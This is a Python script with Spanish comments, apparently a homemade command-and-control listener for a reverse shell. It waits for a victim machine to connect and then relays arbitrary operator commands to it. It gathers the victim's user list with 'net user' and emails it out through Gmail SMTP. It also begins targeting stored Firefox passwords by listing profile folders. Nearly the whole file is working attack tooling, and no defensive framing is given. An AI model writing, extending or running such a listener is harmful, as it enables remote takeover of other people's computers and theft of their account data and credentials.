#!/usr/bin/env python3

# Importación de módulos necesarios
import socket  # Para crear conexiones de red
import signal  # Para manejar señales de interrupción
import sys  # Para interactuar con el sistema
import smtplib  # Para el envío de emails
from termcolor import colored  # Para imprimir texto coloreado en la consola
from email.mime.text import MIMEText  # Para formatear el cuerpo del email

# Función para manejar la señal de interrupción (Ctrl+C)
def def_handler(sig, frame):
    print(colored(f"\n[!] Saliendo...\n", 'red'))
    sys.exit(1)

# Señal de interrupción (Ctrl+C) configurada para llamar a def_handler
signal.signal(signal.SIGINT, def_handler)

# Clase Listener para manejar conexiones y comandos remotos
class Listener:
    def __init__(self, ip, port):
        # Diccionario de opciones disponibles para el usuario
        self.options = {"get users": "List system valid users (Gmail)","Get Firefox":"Get Firefox Stored Passwords", "help": "Show this help panel"}

        # Configuración inicial del socket del servidor
        server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        server_socket.bind((ip, port))
        server_socket.listen()

        print(f"\n[+] Escuchando para próximas conexiones...")

        # Acepta una conexión entrante
        self.client_socket, client_address = server_socket.accept()

        print(f"\n[+] Conexión establecida con {client_address}\n")

    # Método para ejecutar comandos en el cliente remoto
    def execute_remotely(self, command):
        self.client_socket.send(command.encode())
        return self.client_socket.recv(2048).decode()

    # Método para enviar emails
    def send_email(self, subject, body, sender, recipients, password):
        msg = MIMEText(body)
        msg['Subject'] = subject
        msg['From'] = sender
        msg['To'] = ', '.join(recipients)

        # Conexión segura con el servidor SMTP de Gmail y envío del email
        with smtplib.SMTP_SSL('smtp.gmail.com', 465) as smtp_server:
            smtp_server.login(sender, password)
            smtp_server.sendmail(sender, recipients, msg.as_string())
        print(colored(f"\n[+] Email sent Successfully!!", "green"))

    # Método para obtener y enviar la lista de usuarios del sistema
    def get_users(self):
        self.client_socket.send(b"net user")
        output_command = self.client_socket.recv(1024).decode()

        self.send_email("Users List Info -C2", output_command, "elquenviaelmensaje@gmail.com", ["Elquerecibeelmensaje@gmail.com"], "Contraseña de la API")

    # Método para mostrar la ayuda al usuario
    def show_help(self):
        for key, value in self.options.items():
            print(f"\n{key} - {value}\n")

    # Método para obtener y mostrar contraseñas de Firefox (no implementado completamente)
    def get_firefox_passwords(self):
        self.client_socket.send(b"dir C:\\Users\\SAWOPS\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles")
        output_command = self.client_socket.recv(1024).decode()

        print(output_command)

    # Método principal para recibir comandos y responder
    def run(self):
        while True:
            command = input(">> ")

            if command in self.options:
                getattr(self, command.replace(" ", "_"))()
            else:
                command_output = self.execute_remotely(command)
                print(command_output)

if __name__ == '__main__':
    my_listener = Listener("192.168.1.20", 443)
    my_listener.run()
